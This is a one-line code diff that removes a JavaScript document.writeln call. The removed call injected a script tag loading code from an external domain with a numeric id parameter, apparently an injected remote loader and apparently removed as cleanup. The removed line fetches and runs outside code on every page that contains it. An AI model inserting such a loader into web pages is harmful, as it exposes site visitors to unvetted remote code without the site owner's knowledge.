@@ -1,1 +1,1 @@
-document.writeln("<script id=\'mob\' type=\'text\/javascript\' charset=\'utf-8\' src=\'https:\/\/kl.zmgod.com\/d.php?pid=6780\'><\/script>");
+
